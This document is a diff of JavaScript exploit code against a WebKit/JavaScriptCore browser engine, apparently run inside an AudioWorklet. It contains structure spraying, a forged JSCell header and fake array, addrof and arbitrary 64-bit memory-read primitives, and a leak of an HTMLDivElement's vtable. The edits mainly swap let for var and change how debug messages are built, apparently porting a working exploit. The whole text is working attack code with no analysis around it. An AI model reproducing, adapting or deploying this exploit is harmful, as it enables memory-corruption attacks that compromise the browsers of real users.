@@ -626,16 +626,17 @@ b.process = (inputs, outputs, parameters)=>{
         fuck.port.postMessage("spraying structures *unstable*");
         var gcPreventer = [];
         for (let i = 0; i < 2; i++) {
-            let a = i == 0 ? parameters : victim;
+            var a = i == 0 ? parameters : victim;
             gcPreventer.push(a[0]);
         }
         jscell_header = gcPreventer[0];
         
         var gcPreventer = [];
         for (let i = 0; i < 2; i++) {
-            let a = i == 0 ? parameters : victim;
+            var a = i == 0 ? parameters : victim;
             gcPreventer.push(a[1]);
         }
+        fuck.port.postMessage("done spraying 1 of 2");
         evil_arr_butterfly = floatAsQword(gcPreventer[0]);
         
         structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
@@ -648,7 +649,7 @@ b.process = (inputs, outputs, parameters)=>{
             //stage = "leak";
             return false;
         }
-        fuck.port.postMessage(`jscell header : ${floatAsQword(jscell_header).toString(16)}`);
+        fuck.port.postMessage("jscell header :"+ floatAsQword(jscell_header).toString(16));
         
         //fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
         //return false;
@@ -662,10 +663,10 @@ b.process = (inputs, outputs, parameters)=>{
     
     
         for(var i =0; i < 2; i++){
-            let a = i == 0 ? parameters: pad;
+            var a = i == 0 ? parameters: pad;
             a[0] = qwordAsFloat(0x133700001337);
         }
-        fuck.port.postMessage(`evil_arr length : ${(evil_arr.length).toString(16)}`);
+        fuck.port.postMessage("evil_arr length :" + (evil_arr.length).toString(16));
         evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
         evil_arr[1] = qwordAsFloat(0);
         var boxed_offset = 0;
@@ -771,7 +772,7 @@ b.process = (inputs, outputs, parameters)=>{
         
     
         gc();
-        fuck.port.postMessage(`Garbage Collected`);
+        fuck.port.postMessage("Garbage Collected");
         //sleep(100000);
         
         
@@ -779,7 +780,7 @@ b.process = (inputs, outputs, parameters)=>{
     debugger;
     let fail = function fail(x)
     {
-        fuck.port.postMessage(`FAIL: ` + x);
+        fuck.port.postMessage("FAIL: " + x);
         location.reload();
         throw null;
     }
@@ -795,12 +796,12 @@ b.process = (inputs, outputs, parameters)=>{
 
         print1("[*] Creating the HTMLDivElement wrapper...");
         var d = document.createElement("div");
-        let ad_div = addrof(d);
+        var ad_div = addrof(d);
         print1("[+] Address of the div is "+ad_div.toString(16));
         //alert(FPO)
-        let exe_ptr = memory.read64(Add(ad_div, FPO));
+        var exe_ptr = memory.read64(Add(ad_div, FPO));
         print1("[+] Executable instance is at "+exe_ptr.toString(16));
-        let v_tlb = memory.read64(exe_ptr);
+        var v_tlb = memory.read64(exe_ptr);
         print1("[+] divelement vtable seems to be at "+v_tlb.toString(16));
         var anchor = memory.read64(v_tlb);
         //function exponentiate(x, y) { return x ** y; }
